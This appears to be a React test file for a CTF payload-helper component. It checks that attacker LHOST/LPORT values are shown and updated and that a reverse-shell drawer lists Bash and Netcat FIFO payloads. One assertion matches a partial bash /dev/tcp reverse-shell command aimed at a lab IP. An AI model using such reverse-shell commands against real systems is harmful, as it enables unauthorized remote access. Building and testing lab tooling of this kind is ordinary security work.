import React from 'react';
import { render, screen, fireEvent } from '@testing-library/react';
import { describe, it, expect, beforeEach } from 'vitest';
import { FloatingPayloadBar } from './FloatingPayloadBar';
import { useCtfStore } from '../../store/useCtfStore';

describe('FloatingPayloadBar component', () => {
  beforeEach(() => {
    useCtfStore.setState({
      globalVars: {
        lhost: '10.10.14.99',
        lport: '9001',
        targetIp: '10.10.10.200',
        interface: 'tun0',
        customVars: {},
      },
      activeTargetId: null,
      soundEnabled: false,
    });
  });

  it('renders minimized chip with current LHOST and LPORT by default', () => {
    render(<FloatingPayloadBar />);
    expect(screen.getByText('10.10.14.99:9001')).toBeInTheDocument();
  });

  it('expands to full tactical HUD on click', () => {
    render(<FloatingPayloadBar />);
    const chip = screen.getByText('10.10.14.99:9001');
    fireEvent.click(chip);

    expect(screen.getByText('PAYLOAD CONTROLLER')).toBeInTheDocument();
    expect(screen.getByText('LHOST (Attacker)')).toBeInTheDocument();
    expect(screen.getByText('LPORT')).toBeInTheDocument();
    expect(screen.getByDisplayValue('10.10.14.99')).toBeInTheDocument();
    expect(screen.getByDisplayValue('9001')).toBeInTheDocument();
  });

  it('updates globalVars in store when LHOST or LPORT input changes', () => {
    render(<FloatingPayloadBar />);
    // Expand
    fireEvent.click(screen.getByText('10.10.14.99:9001'));

    const lhostInput = screen.getByDisplayValue('10.10.14.99');
    fireEvent.change(lhostInput, { target: { value: '10.10.14.50' } });

    expect(useCtfStore.getState().globalVars.lhost).toBe('10.10.14.50');

    const lportInput = screen.getByDisplayValue('9001');
    fireEvent.change(lportInput, { target: { value: '4444' } });

    expect(useCtfStore.getState().globalVars.lport).toBe('4444');
  });

  it('toggles quick reverse shells drawer and displays interpolated payloads', () => {
    render(<FloatingPayloadBar />);
    // Expand
    fireEvent.click(screen.getByText('10.10.14.99:9001'));

    const toggleBtn = screen.getByText(/Quick 1-Click Reverse Shells/i);
    fireEvent.click(toggleBtn);

    expect(screen.getByText('Bash -i')).toBeInTheDocument();
    expect(screen.getByText('Netcat FIFO')).toBeInTheDocument();
    expect(screen.getByText(/bash -i >& \/dev\/tcp\/10\.10\.14\.99\/9001/)).toBeInTheDocument();
  });
});
